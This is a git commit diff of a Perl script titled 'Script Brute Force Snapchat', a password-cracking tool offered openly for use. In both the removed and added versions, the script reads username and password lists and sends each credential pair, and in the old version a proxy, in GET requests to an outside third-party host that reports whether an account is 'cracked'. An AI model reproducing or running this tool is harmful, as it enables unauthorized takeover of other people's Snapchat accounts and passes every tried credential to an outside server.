90478dc0cf6809581970a6c22ae7ca5059a734cb
1337r00t <u9cc85@gmail.com>
2017-08-04 07:55:12 +0300

    Script Brute Force Snapchat

--- brute.pl
+++ brute.pl
@@ -1,103 +1,50 @@
-use LWP::UserAgent;
+use LWP::UserAgent ;
 system('cls');
-system('color 1e');
-print '
-###################
-# Coded By 1337r00t
-###################
-...........................................................................
-.%%%%....%%%%%%..%%%%%%..%%%%%%.......%%%%%%\...../%%%\..../%%%\....%%%%%%.
-...%%........%%......%%.....(%/.......%%....%)...%:...:%..%:...:%.....%%...
-...%%....%%%%%%..%%%%%%....(%/........%%%%)%.}...%:...:%..%:...:%.....%%...
-...%%........%%......%%...(%/.........%%...\%)...%:...:%..%:...:%.....%%...
-.%%%%%%..%%%%%%..%%%%%%..(%...........%%....\%)...\%%%/....\%%%/......%%...
-...........................................................................
-\n';
 print qq(
-#============================#
-#      BFSnap Cracker        #
-#     C0ded by 1337r00t      #
-#    Instagram: 1337r00t     #
-#============================#\n
-\n1 - With Proxy\n2 - Without Proxy\n\n> );
-$do = <STDIN>;
-chomp($do);
-system('cls');
-#######################################################################################
-if ($do == 1){
-	print qq(
-	Enter Usernames File:
-	> );
-	$userlist=<STDIN>;
-	chomp($userlist);
-	open (USERFILE, "<$userlist") || die "[-] Can't Found The List Of Usernames !";
-	@USERS = <USERFILE>;
-	close USERFILE;
-	
-	print qq(
-	Enter Passwords File :
-	> );
-	$passlist=<STDIN>;
-	chomp($passlist);
-	open (PASSFILE, "<$passlist") || die "[-] Can't Found The List Of Passwords !";
-	@PASSS = <PASSFILE>;
-	close PASSFILE;
-	
-	print qq(
-	Enter Proxys File :
-	> );
-	$proxylist=<STDIN>;
-	chomp($proxylist);
-	open (PROXYFILE, "<$proxylist") || die "[-] Can't Found The List Of Proxys !";
-	@PROXY = <PROXYFILE>;
-	close PROXYFILE;
-	######################
-		foreach $user (@USERS) {
-		chomp $user;
-		foreach $pass (@PASSS) {
-		chomp $pass;
-		foreach $proxy (@PROXY) {
-		chomp $proxy;
-			$ua = LWP::UserAgent->new();
-			$request = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/proxy.php?username=$user&password=$pass&proxy=$proxy");
-			$response = $ua->request($request);
-			$output = $response->content();
-			print "$output\n";
-		}
-		}
-		}
-}
-##################################################################################
-if ($do == 2){
-
+################################
+#
+# Coded By 1337r00t
+#
+# Instagram : @1337r00t
+#
+# Twitter : @_1337r00t
+#
+################################\n);
 print qq(
 Enter Usernames File :
 > );
-$user2=<STDIN>;
-chomp($user2);
-open (USERFILE2, "<$user2") || die "[-] Can't Found The List Of Usernames !";
-@USER2 = <USERFILE2>;
-close USERFILE2;
+$usernames=<STDIN>;
+chomp($usernames);
+open (USERFILE, "<$usernames") || die "[-] Can't Found The List Of Usernames !";
+@USERS = <USERFILE>;
+close USERFILE;
 
 print qq(
 Enter Passwords File :
 > );
-$pass2=<STDIN>;
-chomp($pass2);
-open (PASSFILE2, "<$pass2") || die "[-] Can't Found The List Of Passwords !";
-@PASS2 = <PASSFILE2>;
-close PASSFILE2;
-
+$passwords=<STDIN>;
+chomp($passwords);
+open (PASSFILE, "<$passwords") || die "[-] Can't Found The List Of Passwords !";
+@PASSS = <PASSFILE>;
+close PASSFILE;
+system('cls');
+print "Cracking Now !..\n";
 ######################
-foreach $username2 (@USER2) {
-chomp $username2;
-foreach $password2 (@USER2) {
-chomp $password2;
-	$ua2 = LWP::UserAgent->new();
-	$request2 = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/unproxy.php?username=$username2&password=$password2");
-	$response2 = $ua2->request($request2);
-	$output2 = $response2->content();
-	print "$output2\n";
-}
+foreach $username (@USERS) {
+chomp $username;
+foreach $password (@PASSS) {
+chomp $password;
+	$ua = LWP::UserAgent->new();
+	$request = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/?username=$username&password=$password");
+	$response = $ua->request($request);
+	$output = $response->content();
+	if ($response->content=~ /cracked/) {
+		print "$output\n";
+		exit;
+	}
+	else
+	{
+		print "$output\n";
+	}
 }
 }
